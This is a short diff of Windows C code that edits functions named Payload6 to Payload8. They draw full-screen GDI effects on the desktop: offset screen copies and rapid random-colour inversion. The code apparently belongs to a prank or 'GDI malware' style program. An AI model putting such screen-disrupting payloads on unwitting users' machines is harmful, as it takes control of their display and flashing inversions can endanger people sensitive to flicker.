@@ -264,6 +264,7 @@ VOID Payload6(_In_ INT t, _In_ HDC hdcScreen) {
 	SelectObject(hcdcScreen, hBitmap);
 
 	BitBlt(hcdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hdcScreen, ptScreen.x, ptScreen.y, SRCCOPY);
+
 	BitBlt(hcdcScreen, ptScreen.x, ptScreen.y + 5, szScreen.cx, szScreen.cy, hdcScreen, ptScreen.x, ptScreen.y, SRCAND);
 	BitBlt(hcdcScreen, ptScreen.x, ptScreen.y - 5, szScreen.cx, szScreen.cy, hdcScreen, ptScreen.x, ptScreen.y, SRCAND);
 
@@ -271,9 +272,22 @@ VOID Payload6(_In_ INT t, _In_ HDC hdcScreen) {
 
 	DeleteObject(hBitmap);
 	DeleteObject(hcdcScreen);
+
+	Sleep(50);
 }
 
 VOID Payload7(_In_ INT t, _In_ HDC hdcScreen) {
+	POINT ptScreen = GetVirtualScreenPos();
+	SIZE szScreen = GetVirtualScreenSize();
+
+	COLORREF rgb = RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255);
+	HBRUSH randrgb = CreateSolidBrush(rgb);
+	SelectObject(hdcScreen, randrgb);
+	PatBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, PATINVERT);
+	DeleteObject(randrgb);
+}
+
+VOID Payload8(_In_ INT t, _In_ HDC hdcScreen) {
 	POINT ptScreen = GetVirtualScreenPos();
 	SIZE szScreen = GetVirtualScreenSize();
 	HDC hcdcScreen = CreateCompatibleDC(hdcScreen);
